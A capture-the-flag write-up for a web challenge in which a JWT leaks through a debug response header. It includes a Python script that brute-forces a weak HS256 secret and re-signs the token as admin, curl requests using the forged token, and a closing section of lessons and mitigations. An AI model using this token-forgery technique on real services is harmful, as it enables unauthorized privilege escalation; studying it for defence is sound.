---
title: "Web Exploitation - Token Leak"
category: "Web"
difficulty: "Medium"
author: "havoc"
date: "2025-11-03"
description: "Exploiting a JWT token leak vulnerability to gain unauthorized access"
---

## Summary

In this challenge, we discovered a JWT token leak in the application's API response headers. By intercepting the response and decoding the token, we were able to escalate privileges and access restricted endpoints.

## Reconnaissance

First, we started by analyzing the application structure:

```bash
curl -I https://target.ctf.com/api/user
```

The response revealed an interesting header:

```
X-Debug-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

## Exploitation Steps

### Step 1: Token Analysis

We decoded the JWT token using jwt.io:

![JWT Token Analysis](/images/writeups/jwt-analysis.jpg)

```json
{
  "sub": "1234567890",
  "name": "guest",
  "role": "user",
  "iat": 1516239022
}
```

### Step 2: Token Manipulation

Since the token was signed with a weak secret, we attempted a dictionary attack:

```python
import jwt
import requests

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Common secrets wordlist
secrets = ["secret", "password", "admin", "123456"]

for secret in secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret found: {secret}")
        
        # Modify payload
        decoded['role'] = 'admin'
        new_token = jwt.encode(decoded, secret, algorithm="HS256")
        print(f"[+] New token: {new_token}")
        break
    except:
        continue
```

### Step 3: Privilege Escalation

With our forged admin token, we accessed the admin panel:

```bash
curl -H "Authorization: Bearer NEW_TOKEN" https://target.ctf.com/api/admin/flag
```

## Flag

```
CTF{jwt_s3cr3t5_4r3_n0t_s3cr3t}
```

## Lessons Learned

1. **Never expose tokens in response headers** - Especially debug tokens in production.
2. **Use strong secrets** - JWT secrets should be cryptographically random.
3. **Implement proper token validation** - Validate token claims on every request.
4. **Rotate secrets regularly** - Even strong secrets should be rotated periodically.

## Mitigation

- Remove debug headers from production
- Use environment variables for secrets
- Implement token expiration (exp claim)
- Use asymmetric signing (RS256) instead of symmetric (HS256)

---

**Difficulty Rating:** 🟡 Medium  
**Category:** Web Exploitation  
**Points:** 500
